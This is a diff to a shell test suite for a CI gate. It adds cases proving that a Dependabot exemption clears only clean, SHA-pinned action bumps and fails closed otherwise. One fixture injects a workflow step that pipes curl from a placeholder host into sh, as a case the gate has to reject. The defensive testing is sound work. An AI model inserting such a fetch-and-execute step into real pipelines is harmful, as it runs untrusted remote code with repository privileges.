@@ -41,6 +41,15 @@ case_run() {
     printf '%s\n' "$commits" > "$work/.commits"
     args+=(--authorship "$work/.commits")
   fi
+  # CASE_DIFF: the unified diff this case wants the gate to read. The work tree is
+  # a tar copy with no `.git`, so the gate can never produce one here on its own -
+  # and that is deliberate: with no diff no content exemption applies, so every
+  # case written before exemptions existed keeps its old verdict unchanged. A case
+  # that wants an exemption evaluated has to hand the diff over, in writing.
+  if [ -n "${CASE_DIFF:-}" ]; then
+    printf '%s\n' "$CASE_DIFF" > "$work/.diff"
+    args+=(--diff "$work/.diff")
+  fi
   [ "$branch" = "NONE" ] || args+=(--branch "$branch")
   [ "$files" = "NOLIST" ] && args=(--branch "$branch" --changed-files "$work/.missing")
   # Hermetic on purpose. On a CI runner GITHUB_HEAD_REF and GITHUB_BASE_REF are
@@ -200,6 +209,91 @@ case_run changed-file-list-missing bot/x NOLIST 2 "" ""
 case_run data-file-unusable bot/x 'README.md' 2 "" '
 import os,pathlib
 (pathlib.Path(os.environ["EHS_WORK"])/"scripts/gates/data/protected-paths.json").write_text("{")'
+
+# --------------------------------------------------------------------------
+# The hole this gate had on 2026-09-01, from the other side: it failed on EVERY
+# Dependabot pull request in the github_actions ecosystem, and could never have
+# passed one. `.github/workflows/**` became protected on 23c240f; PR #73 taught
+# the gate to recognise `[bot]`. Both right; their intersection unsatisfiable,
+# because editing workflow files IS the work of that ecosystem. Measured: the
+# same branch went green on 31 Aug and red four times on 1 Sep, leaving a
+# one-line bump of a SECURITY action red since 31 August.
+#
+# The exemption is about WHAT changed, never who changed it. These cases are the
+# proof: exactly one of them is allowed to pass.
+BOT_ID='a5596c8\tdependabot[bot] <support@github.com>\tGitHub <noreply@github.com>\t'
+PINNED_BUMP='diff --git a/.github/workflows/scorecard.yml b/.github/workflows/scorecard.yml
+--- a/.github/workflows/scorecard.yml
++++ b/.github/workflows/scorecard.yml
+@@ -65 +65 @@
+-        uses: github/codeql-action/upload-sarif@ff2f1c621b7f889edc0d3c761ac2e6a3f8cdb0dd # v4.37.7
++        uses: github/codeql-action/upload-sarif@db488ddef3bf6cb639b32c2e9a7c0a7ea8271d28 # v4.37.8'
+
+CASE_DIFF="$PINNED_BUMP" \
+case_run bot-bumps-a-pinned-action-and-that-is-all dependabot/github_actions/g \
+  '.github/workflows/scorecard.yml' 0 "pinned-action-bump" "" "$BOT_ID"
+
+CASE_DIFF="$PINNED_BUMP
+diff --git a/.github/workflows/scorecard.yml b/.github/workflows/scorecard.yml
+--- a/.github/workflows/scorecard.yml
++++ b/.github/workflows/scorecard.yml
+@@ -65 +65 @@
+-      contents: read
++      contents: write" \
+case_run bot-also-widens-permissions dependabot/github_actions/g \
+  '.github/workflows/scorecard.yml' 1 "an automation that can edit its own limits has none" "" "$BOT_ID"
+
+CASE_DIFF="$PINNED_BUMP
+diff --git a/.github/workflows/scorecard.yml b/.github/workflows/scorecard.yml
+--- a/.github/workflows/scorecard.yml
++++ b/.github/workflows/scorecard.yml
+@@ -65 +65 @@
++        run: curl https://example.invalid/x | sh" \
+case_run bot-also-injects-a-run-step dependabot/github_actions/g \
+  '.github/workflows/scorecard.yml' 1 "an automation that can edit its own limits has none" "" "$BOT_ID"
+
+# A tag or a branch is a mutable reference, and pinning is the whole reason this
+# repository holds SHAs. The exemption can only ever make a pinned repo MORE
+# pinned, so a bump AWAY from a SHA is not one.
+CASE_DIFF="diff --git a/.github/workflows/scorecard.yml b/.github/workflows/scorecard.yml
+--- a/.github/workflows/scorecard.yml
++++ b/.github/workflows/scorecard.yml
+@@ -65 +65 @@
+-        uses: github/codeql-action/upload-sarif@ff2f1c621b7f889edc0d3c761ac2e6a3f8cdb0dd # v4.37.7
++        uses: github/codeql-action/upload-sarif@v4 # v4.37.8" \
+case_run bot-unpins-an-action-to-a-tag dependabot/github_actions/g \
+  '.github/workflows/scorecard.yml' 1 "an automation that can edit its own limits has none" "" "$BOT_ID"
+
+# The exemption is scoped to workflows. A bot editing any other limit is the
+# case this gate was built for and stays red.
+CASE_DIFF="diff --git a/scripts/gates/data/budget-ledger.json b/scripts/gates/data/budget-ledger.json
+--- a/scripts/gates/data/budget-ledger.json
++++ b/scripts/gates/data/budget-ledger.json
+@@ -1 +1 @@
+-  \"value\": 12288
++  \"value\": 99999" \
+case_run bot-edits-a-budget-not-a-workflow dependabot/github_actions/g \
+  'scripts/gates/data/budget-ledger.json' 1 "an automation that can edit its own limits has none" "" "$BOT_ID"
+
+# The exemption clears a FILE, not a pull request. A clean bump travelling beside
+# another limit does not carry it through.
+CASE_DIFF="$PINNED_BUMP
+diff --git a/scripts/gates/gate-secret-scan.sh b/scripts/gates/gate-secret-scan.sh
+--- a/scripts/gates/gate-secret-scan.sh
++++ b/scripts/gates/gate-secret-scan.sh
+@@ -1 +1 @@
+-x
++y" \
+case_run bot-bump-beside-another-limit dependabot/github_actions/g \
+  '.github/workflows/scorecard.yml
+scripts/gates/gate-secret-scan.sh' 1 "gate-secret-scan.sh" "" "$BOT_ID"
+
+# Fails CLOSED. The same clean bump with NO diff supplied stays red, because the
+# question was never asked. A rule that turns into a pass when its input goes
+# missing is the false green this repository has already been burned by.
+case_run bot-bump-with-no-diff-stays-protected dependabot/github_actions/g \
+  '.github/workflows/scorecard.yml' 1 "no diff was supplied" "" "$BOT_ID"
+
 
 echo
 echo "Summary: $pass ok, $fail failures"
